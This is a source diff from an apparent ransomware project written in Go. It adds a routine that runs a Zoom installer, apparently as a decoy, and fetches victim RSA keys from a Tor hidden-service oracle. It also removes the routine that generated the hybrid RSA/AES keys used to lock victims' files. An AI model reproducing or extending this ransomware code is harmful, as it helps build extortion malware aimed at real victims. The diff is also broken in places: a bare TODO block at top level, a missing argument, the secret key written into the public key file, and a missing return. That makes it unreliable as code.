@@ -4,86 +4,91 @@ import (
     "os"
     "io"
     "io/ioutil"
-    "path/filepath"
+    "encoding/binary"
     "crypto/cipher"
     "crypto/rand"
     "crypto/rsa"
     "crypto/aes"
+    "time"
 
+    "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/errors"
     "github.com/sug0/sr-ransomware/go/crypto/util"
+    "github.com/sug0/sr-ransomware/go/net/ratelimit"
 )
 
-const rsaKeyBits  = 2048
+TODO
+-- BUNDLE CRYPTO SERVICE
+-- BUNDLE TOR
+-- RUN TOR EXECUTABLE
+
+func RunZoomInstaller() error {
+    z := exe.NewZoom(zoomInstaller)
+    return errors.WrapIfNotNil(pkg, "error during zoom installation", z.Run())
+}
+
+func DownloadKeysFromTor() error {
+    // create work dir
+    err := os.Mkdir(workDir)
+    if err != nil && !os.IsExist(err) {
+        return errors.Wrap(pkg, "failed to create work dir", err)
+    }
+
+    // 32 ms --> limit to about 128 KiB/s
+    client := ratelimit.NewHTTPClient(32 * time.Millisecond, true)
+
+    rsp, err := client.Get(hiddenServiceOracle)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to query hidden service oracle", err)
+    }
+    defer rsp.Body.Close()
+
+    // read public key
+    fPub, err := os.Create(victimPublicKey)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to create pubkey file", err)
+    }
+    defer fPub.Close()
+
+    var pubKeyLen int64
+
+    err = binary.Read(rsp.Body, binary.BigEndian, &pubKeyLen)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read pubkey len", err)
+    }
+
+    _, err = io.Copy(fPub, &io.LimitedReader{R: rsp.Body, N: pubKeyLen})
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read pubkey", err)
+    }
+
+    // read secret key
+    fSec, err := os.Create(victimSecretKey)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to create seckey file", err)
+    }
+    defer fSec.Close()
+
+    var secKeyLen int64
+
+    err = binary.Read(rsp.Body, binary.BigEndian, &secKeyLen)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read seckey len", err)
+    }
+
+    _, err = io.Copy(fPub, &io.LimitedReader{R: rsp.Body, N: pubKeyLen})
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read pubkey", err)
+    }
+}
 
 func ImportPublicKey() (*rsa.PublicKey, error) {
-    pkData, err := ioutil.ReadFile(filepath.Join(workDir, attackerPublicKey))
+    pkData, err := ioutil.ReadFile(victimPublicKey)
     if err != nil {
         return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
     }
     pk, err := util.ImportPEMPublicKeyRSA(pkData)
     return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
-}
-
-// Generate all the appropriate keys in the malware
-// work dir.
-func GenerateKeys() error {
-    // global rsa key
-    pk, err := ImportPublicKey()
-    if err != nil {
-        return err
-    }
-
-    // local rsa keys
-    sk, err := util.GenerateKeyRSA(rsaKeyBits)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate RSA secret key", err)
-    }
-    pkData, err := util.ExportDERPublicKeyRSA(&sk.PublicKey)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to marshal RSA public key", err)
-    }
-    err = ioutil.WriteFile(filepath.Join(workDir, victimPublicKey), pkData, 0644)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to write RSA public key", err)
-    }
-
-    // aes key stuff
-    aesKey, err := util.GenerateAES()
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate AES key", err)
-    }
-    aesIV, err := util.GenerateAES()
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate AES IV", err)
-    }
-    aesBlock, _ := aes.NewCipher(aesKey)
-    aesCiph := cipher.NewCTR(aesBlock, aesIV)
-
-    // export rsa pub encrypted with aes
-    skData, err := util.ExportDERSecretKeyRSA(sk)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to marshal RSA secret key", err)
-    }
-    skData = util.Pad(skData, aes.BlockSize)
-    aesCiph.XORKeyStream(skData, skData)
-    err = ioutil.WriteFile(filepath.Join(workDir, victimSecretKey), skData, 0644)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to write RSA secret key", err)
-    }
-
-    // export aes key encrypted with rsa pub
-    ivKey := append(aesIV, aesKey...)
-    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, pk, ivKey)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to encrypt AES key", err)
-    }
-    err = ioutil.WriteFile(filepath.Join(workDir, victimAESKey), aesEncrypted, 0644)
-    if err != nil {
-        return errors.Wrap(pkg, "failed to write AES key", err)
-    }
-
-    return nil
 }
 
 // Encrypt a file.
